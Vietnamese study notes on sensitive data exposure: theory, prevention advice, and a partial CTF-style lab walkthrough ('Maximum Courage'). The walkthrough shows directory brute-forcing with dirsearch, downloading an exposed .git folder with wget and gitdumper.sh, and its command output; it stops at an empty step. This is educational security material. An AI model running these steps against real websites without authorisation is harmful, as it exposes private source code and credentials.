I. Lý thuyết<br>
1. tiết lộ data nhạy cảm là gì<br>
- vul này xảy ra khi data bị lộ cho 1 user, người ko đc ủy quyền rõ ràng để truy cập vào data đó
- VD: password login, int4 riêng tư của user, ...<br>

2. cách để test<br>
- vul này ko thể tìm kiếm or test giống như các vul thông thg
- hầu hết các vul này đều ko thể scan
- VD:<br>
+ app lưu password của user ở dạng văn bản thuần túy
+ password dễ crack
+ API token bị lộ trong mã nguồn công khai (github)<br>
- VD thực:<br>
+ giả sử đang test 1 web trong khi xài dirb để brute-force các thư mục và tìm thấy 1 .git có sẵn
+ thư mục git giúp tìm thấy các vul mới bằng cách phân tích mã nguồn 
+ đồng thời tìm thấy các file chứa data nhạy cảm
+ download thư mục .git để kết xuất data (xài wget)
- dùng tool (https://github.com/internetwache/GitTools) or lệnh thủ công để kết xuất data:<br>
+ git status# -> trả về file đã bị xóa và thư mục trống
+ git checkout --.# -> khôi phục file và tải xuống thư mục
+ git log# -> xem có những commit nào khác
- một số cách khác để lấy data nhạy cảm:<br>
+ tìm file mã nguồn (.old, .bak, ..)
+ file ẩn
+ file JS
+ thư mục github (của mục tiêu)<br>

3. phòng tránh<br>
- tìm data nhạy cảm để bảo vệ
- sau khi bảo vệ, truy cập những data rủi ro này và đảm bảo:<br>
+ data ko đc lưu trữ ở dạng văn bản rõ ràng
+ data ko đc truyền dưới dạng văn bản rõ ràng mà phải xài HTTPS
+ xài thuật toán đủ phức tạp để mã hóa data
+ bảo mật việc tạo key<br>

4. tool<br>
- https://portswigger.net/
- brute-force thư mục: https://wiki.owasp.org/index.php/Category:OWASP_DirBuster_Project
- kết xuất 1 thư mục git từ 1 web: https://github.com/internetwache/GitTools<br>

II. lap: Maximum Courage<br>
1. phân tích url -> tìm ra thư mục .git: http://wlemxwl32epheze6eg23gmgi834kj6zq9oj9s6z9-web.cybertalentslabs.com/.git/<br>

```
python3 dirsearch.py -u http://wlemxwl32epheze6eg23gmgi834kj6zq9oj9s6z9-web.cybertalentslabs.com/

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11723

Output: /root/dirsearch/reports/http_wlemxwl32epheze6eg23gmgi834kj6zq9oj9s6z9-web.cybertalentslabs.com/__24-08-01_04-06-09.txt

Target: http://wlemxwl32epheze6eg23gmgi834kj6zq9oj9s6z9-web.cybertalentslabs.com/

[04:06:09] Starting: 
[04:06:28] 301 -  417B  - /.git  ->  http://wlemxwl32epheze6eg23gmgi834kj6zq9oj9s6z9-web.cybertalentslabs.com/.git/
[04:06:28] 200 -    3KB - /.git/                                            
[04:06:28] 200 -   23B  - /.git/HEAD
[04:06:28] 200 -  266B  - /.git/COMMIT_EDITMSG                              
[04:06:28] 200 -    3KB - /.git/hooks/
[04:06:28] 200 -  196B  - /.git/config
[04:06:28] 200 -  209B  - /.git/index                                       
[04:06:28] 200 - 1000B  - /.git/info/                                       
[04:06:28] 200 -  240B  - /.git/info/exclude                                
[04:06:29] 200 -    1KB - /.git/logs/                                       
[04:06:28] 200 -   73B  - /.git/description
[04:06:29] 200 -  148B  - /.git/logs/HEAD
[04:06:29] 301 -  427B  - /.git/logs/refs  ->  http://wlemxwl32epheze6eg23gmgi834kj6zq9oj9s6z9-web.cybertalentslabs.com/.git/logs/refs/
[04:06:29] 301 -  433B  - /.git/logs/refs/heads  ->  http://wlemxwl32epheze6eg23gmgi834kj6zq9oj9s6z9-web.cybertalentslabs.com/.git/logs/refs/heads/
[04:06:29] 200 -  148B  - /.git/logs/refs/heads/master
[04:06:29] 200 -    2KB - /.git/objects/                                    
[04:06:29] 200 -    1KB - /.git/refs/
[04:06:29] 301 -  427B  - /.git/refs/tags  ->  http://wlemxwl32epheze6eg23gmgi834kj6zq9oj9s6z9-web.cybertalentslabs.com/.git/refs/tags/
[04:06:29] 200 -   41B  - /.git/refs/heads/master                           
[04:06:29] 301 -  428B  - /.git/refs/heads  ->  http://wlemxwl32epheze6eg23gmgi834kj6zq9oj9s6z9-web.cybertalentslabs.com/.git/refs/heads/
[04:06:31] 403 -  351B  - /.ht_wsr.txt                                      
[04:06:32] 403 -  354B  - /.htaccess.bak1                                   
[04:06:32] 403 -  356B  - /.htaccess.sample                                 
```

2. tải thư mục về và phân tích: wget -r http://wlemxwl32epheze6eg23gmgi834kj6zq9oj9s6z9-web.cybertalentslabs.com/.git 
<br>

3. thu được các file sau và phân tích -> file: flag.txt sai<br>

```
ls -la            
total 152
drwxr-xr-x 10 root root  4096 Aug  1 04:11 .
drwx------ 22 root root 20480 Aug  1 04:04 ..
-rw-r--r--  1 root root  4764 Jul 31 13:09 CHANGELOG.md
-rw-r--r--  1 root root  1846 Jul 31 13:09 config.ini
-rw-r--r--  1 root root  4021 Jul 31 13:09 CONTRIBUTORS.md
-rw-r--r--  1 root root     9 Jul 31 14:58 custom_wordlist.txt
drwxr-xr-x  2 root root  4096 Jul 31 13:09 db
-rwxr-xr-x  1 root root  2504 Jul 31 13:09 dirsearch.py
-rw-r--r--  1 root root   299 Jul 31 13:09 Dockerfile
-rw-r--r--  1 root root    40 Nov  4  2020 flag.txt
drwxr-xr-x  8 root root  4096 Jul 31 13:09 .git
drwxr-xr-x  4 root root  4096 Jul 31 13:09 .github
-rw-r--r--  1 root root    81 Jul 31 13:09 .gitignore
-rw-------  1 root root  8895 Jul 31 15:08 index.html.tmp.tmp
-rwxr-xr-x  1 root root    85 Jul 31 13:09 __init__.py
drwxr-xr-x 10 root root  4096 Jul 31 13:31 lib
-rw-r--r--  1 root root    68 Jul 31 13:09 options.ini
-rw-r--r--  1 root root 22635 Jul 31 13:09 README.md
drwxr-xr-x  4 root root  4096 Aug  1 04:06 reports
-rw-r--r--  1 root root   315 Jul 31 13:09 requirements.txt
-rw-r--r--  1 root root   189 Jul 31 13:09 setup.cfg
-rwxr-xr-x  1 root root  1473 Jul 31 13:09 setup.py
drwxr-xr-x  2 root root  4096 Jul 31 13:09 static
-rwxr-xr-x  1 root root  1563 Jul 31 13:09 testing.py
drwxr-xr-x  7 root root  4096 Jul 31 13:09 tests
drwxr-xr-x  4 root root  4096 Aug  1 04:11 wlemxwl32epheze6eg23gmgi834kj6zq9oj9s6z9-web.cybertalentslabs.com
```

4. tìm được tệp flag.php:<br>

```
find . -name flag.php
./wlemxwl32epheze6eg23gmgi834kj6zq9oj9s6z9-web.cybertalentslabs.com/flag.php
```

5. đọc nội dung tệp -> ko xem trực tiếp đc lại tìm thấy 1 thư mục .git -> kết xuất nó:<br>
```
./gitdumper.sh http://wlemxwl32epheze6eg23gmgi834kj6zq9oj9s6z9-web.cybertalentslabs.com/.git/ ./moon
###########
# GitDumper is part of https://github.com/internetwache/GitTools
#
# Developed and maintained by @gehaxelt from @internetwache
#
# Use at your own risk. Usage might be illegal in certain circumstances. 
# Only for educational purposes!
###########


[*] Destination folder does not exist
[+] Creating ./moon/.git/
[-] Downloaded: HEAD
[-] Downloaded: objects/info/packs
[-] Downloaded: description
[-] Downloaded: config
[-] Downloaded: COMMIT_EDITMSG
[-] Downloaded: index
[-] Downloaded: packed-refs
[-] Downloaded: refs/heads/master
[-] Downloaded: refs/remotes/origin/HEAD
[-] Downloaded: refs/stash
[-] Downloaded: logs/HEAD
[-] Downloaded: logs/refs/heads/master
[-] Downloaded: logs/refs/remotes/origin/HEAD
[-] Downloaded: info/refs
[-] Downloaded: info/exclude
[-] Downloaded: /refs/wip/index/refs/heads/master
[-] Downloaded: /refs/wip/wtree/refs/heads/master
```

6. 
